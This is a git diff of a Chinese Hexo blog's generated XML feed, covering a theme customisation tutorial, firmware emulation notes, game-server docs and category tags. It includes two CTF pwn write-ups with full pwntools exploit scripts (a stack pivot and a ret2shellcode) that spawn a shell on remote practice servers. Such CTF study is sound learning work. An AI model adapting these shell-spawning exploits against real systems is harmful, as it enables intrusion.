+<img src="/posts/a5aaf96c/image-20241027223321828.png" class="" title="image-20241027223321828">
+</li>
+<li><p>引入自定义的js、css文件<br>直接在主题配置文件中配置即可，这里我的配置文件为_config.butterfly.yml，在文件中找到inject</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/style.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>添加自定义css文件</p>
+<p>在&#x2F;source&#x2F;config&#x2F;css中新建style.css文件，添加如下内容：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 去除导航栏选项中底下的蓝条 */</span></span><br><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导航栏菜单鼠标移入字体放大 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">28px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>可以成功实现效果，不过有点不协调，如果导航栏居中的话可以使用这一效果（类似于mac的dork效果）。</p>
+<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/a5aaf96c/image-20241027225811317.png" class="" title="image-20241027225811317">
+]]></content>
+      <tags>
+        <tag>教程</tag>
+        <tag>Hexo</tag>
+        <tag>建站</tag>
+        <tag>美化</tag>
       </tags>
   </entry>
   <entry>
@@ -2424,6 +2485,9 @@
 <img src="/posts/d96204a2/image-20241103210850411.png" class="" title="image-20241103210850411">
 
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
       <tags>
         <tag>固件模拟</tag>
         <tag>QEMU</tag>
@@ -2514,6 +2578,9 @@
 <p>在qemu启动时添加<code>-S -s</code>参数，-S参数表示qemu不要启动程序，处于阻塞状态，等待gdb指令。-s参数表示启动gdb-server监听在TCP端口1234上。</p>
 <p>（待完善）</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
       <tags>
         <tag>QEMU</tag>
       </tags>
@@ -2632,6 +2699,9 @@
 <p>输入过长payload造成栈溢出</p>
 <img src="/posts/604570cd/image-20241107142300722.png" class="" title="image-20241107142300722">
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
       <tags>
         <tag>固件</tag>
       </tags>
@@ -2743,7 +2813,7 @@
 <p>开启后可以看到日志信息：</p>
 <img src="/posts/5fd89f19/image-20241120233906105.png" class="" title="image-20241120233906105">
 
-<p>发现服务器拒绝连接，使用<a href="http://127.0.0.1访问发现为404,首先怀疑是安装mimtproxy的证书./">http://127.0.0.1访问发现为404，首先怀疑是安装mimtproxy的证书。</a></p>
+<p>发现服务器拒绝连接，使用<code>http://127.0.0.1</code>访问发现为404，首先怀疑是安装mimtproxy的证书。</p>
 <p>参考链接：<a href="https://www.jianshu.com/p/036e5057f0b9">mitmproxy的下载及证书配置</a></p>
 <blockquote>
 <p>此处要注意现有工具设置的代理端口为8891</p>
@@ -2846,6 +2916,9 @@
 <h3 id="更新cg动画为中文"><a href="#更新cg动画为中文" class="headerlink" title="更新cg动画为中文"></a>更新cg动画为中文</h3><p>找国服的Video重命名后替换即可</p>
 <h3 id="解包图片等资源"><a href="#解包图片等资源" class="headerlink" title="解包图片等资源"></a>解包图片等资源</h3><p>使用<a href="https://github.com/RazTools/Studio">AssetStudio</a>工具来提取.&#x2F;StreamingAssets&#x2F;Asb&#x2F;pc中的wmv数据。</p>
 ]]></content>
+      <categories>
+        <category>PemukulPaku</category>
+      </categories>
       <tags>
         <tag>教程</tag>
       </tags>
@@ -2915,11 +2988,9 @@
 <li><a href="/posts/8fbda5e4.html" title="PemukulPaku-IslandDisjoinEquipmentReqHandler">IslandDisjoinEquipmentReq</a></li>
 <li><a href="/posts/783a5418.html" title="PemukulPaku-EquipmentEvoReqHandler">EquipmentEvoReq</a></li>
 </ul>
-<h3 id="商店功能"><a href="#商店功能" class="headerlink" title="商店功能"></a>商店功能</h3><ul>
+<h3 id="商店与充值功能"><a href="#商店与充值功能" class="headerlink" title="商店与充值功能"></a>商店与充值功能</h3><ul>
 <li><a href="/posts/6b761fa9.html" title="GetShopListReq">GetShopListReq</a></li>
 <li><a href="/posts/308d4464.html" title="PemukulPaku-BuyGoodsReqHandler">BuyGoodsReq</a></li>
-</ul>
-<h3 id="充值功能"><a href="#充值功能" class="headerlink" title="充值功能"></a>充值功能</h3><ul>
 <li><a href="/posts/8bee2b6e.html" title="PemukulPaku-GetProductListReqHandler">GetProductListReq</a></li>
 <li><a href="/posts/dc044fb2.html" title="PemukulPaku-BuyProductReq">BuyProductReq</a></li>
 <li><a href="/posts/8063f392.html" title="PemukulPaku-GetShoppingMallListReqHandler">GetShoppingMallListReq</a></li>
@@ -2940,6 +3011,12 @@
 <li>GetArmadaDataReq(舰团)</li>
 </ul>
 ]]></content>
+      <categories>
+        <category>PemukulPaku</category>
+      </categories>
+      <tags>
+        <tag>教程</tag>
+      </tags>
   </entry>
   <entry>
     <title>【ciscn_2019_es_2】WriteUp</title>
@@ -2960,6 +3037,9 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x080485BE&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27006</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line">system_addr = <span class="number">0x08048400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出泄漏ebp地址，用于栈迁移</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，进行栈迁移，通过修改ebp来达到修改eip的目的 </span></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;aaaa&#x27;</span>, system_addr, <span class="number">0</span>, ebp_addr-<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(ebp_addr-<span class="number">0x38</span>, leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>Pwn</tag>
         <tag>栈迁移</tag>
@@ -2978,6 +3058,9 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>Pwn</tag>
         <tag>Ret2Shellcode</tag>
@@ -3012,10 +3095,14 @@
 
 
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>Pwn</tag>
         <tag>Heap</tag>
-        <tag>Fastbin Attack</tag>
+        <tag>Fastbin</tag>
+        <tag>Attack</tag>
       </tags>
   </entry>
   <entry>
@@ -3024,6 +3111,9 @@
     <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
 <h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
 ]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
       <tags>
         <tag>论文复现</tag>
         <tag>内核</tag>
@@ -3061,6 +3151,9 @@
 <p>error：<code>./bootstrap.sh: 2: autoreconf: not found</code></p>
 <p>解决方案：<code>sudo apt-get install autoconf</code></p>
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
       </tags>
@@ -3084,6 +3177,9 @@
 </ul>
 <p>可以使用nsenter从外部进入已有命名空间eg：nsenter –mount&#x3D;&#x2F;proc&#x2F;xxxx&#x2F;ns&#x2F;mnt [file]<br>(与setns系统调用有关)</p>
 ]]></content>
+      <categories>
+        <category>CTF练习</category>
+      </categories>
       <tags>
         <tag>CTF</tag>
         <tag>Sandbox</tag>
